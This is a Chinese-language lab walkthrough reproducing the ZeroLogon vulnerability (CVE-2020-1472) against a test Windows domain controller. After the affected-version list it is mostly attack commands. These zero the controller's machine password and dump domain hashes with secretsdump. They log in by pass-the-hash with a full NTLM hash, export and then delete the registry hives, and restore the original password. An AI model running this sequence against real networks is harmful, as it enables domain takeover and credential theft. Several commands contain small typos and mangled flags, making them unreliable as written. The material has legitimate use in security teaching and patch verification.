0x00 漏洞概述

CVE-2020-1472是一个windows域控中严重的远程权限提升漏洞，此漏洞是微软8月份发布安全公告披露的紧急漏洞，CVSS评分为10分。未经身份认证的攻击者可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞，成功利用此漏洞的攻击者可获得域管理员权限。该漏洞由 Secura 公司的 Tom Tervoort 发现提交并命名为 ZeroLogon。

0x01 影响范围

 Windows受影响版本:  Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)  Samba受影响版本：  4.0 < Samba < 4.8 且 未配置 server schannel = yes Samba > 4.0 且 Smb.conf配置文件中配置了server schannel = no或server schannel = auto

0x04 漏洞复现

1、通过某种方式获取到一台域成员机器权限。

进行信息收集，得到域控的ip为192.168.159.132，域控主机名为：08server-DC

2、检测漏洞

 python3 zerologon_tester.py 域控的计算机名 域控IP python3 zerologon_tester.py 08server-DC 192.168.159.132

如图：显示susccess! 证明可能存在此漏洞


3、exp攻击域控

置空域控保存在AD中的密码：

 python3 cve-2020-1472-explit.py 域控计算机名 域控IP python3 cve-2020-1472-explit.py 08server-DC 192.168.159.132



4、抓取域控用户Hash

通过secresdump.py来获取域控相关hash。之前在准备工具那里有提到，选择性下载impacket，是因为kali里面已经内置了这套工具，而且都封装成了全局命令，可以直接进行调用的。下面两者命令都可以。

 python3 secretsdump.py 域/域控计算机名\$@域控ip -jus-dc -no-pass impacket-secretsdump moonsec.fbi/08server-DC\$@192.168.159.132 -just-dc -no-pass#空密码链接

5、利用获取的hash登陆域控机器

 python3 wmiexec.py -hashes 账户哈希 域/账户名@域控IP，可以看到成功登陆域控机 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942 moonsec.fbi/administrator@192.168.159.132


6、抓取SAM文件中原来的HASH到本地

在域控主机上从注册表导出hash文件。注意这里有一个坑点，如图上红字说明。之后从目标机器上下载下来这三个文件，并且删除域控机器上的这三个文件。

 reg save HKLM\SYSTEM system.save reg save HKLM\SAM sam.save reg save HKLM\SECURITY security.save  get sam.save get security.save get system.save del *.save


7、获取目标原始hash

使用secretsdump读取下载到本地的hash文件,获取域控机器账户置空前的原始hash。

 python3 secretsdump.py –sam sam.save –system system.save –security security.save LOCAL impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

记住截图中的这32位hash值

8、恢复初始hash

使用hash恢复工具，并用命令恢复原来的密码:

python3 reinstall_original_pw.py 域控计算机名 域控IP 保存的那串hash值python3 reinstall_original_pw.py 08server-DC 192.168.159.132 a282410fcfd81ab8f02ddb1fbbc9d444

9、再次使用空密码检测

可以看到已经无法再用空密码攻击了
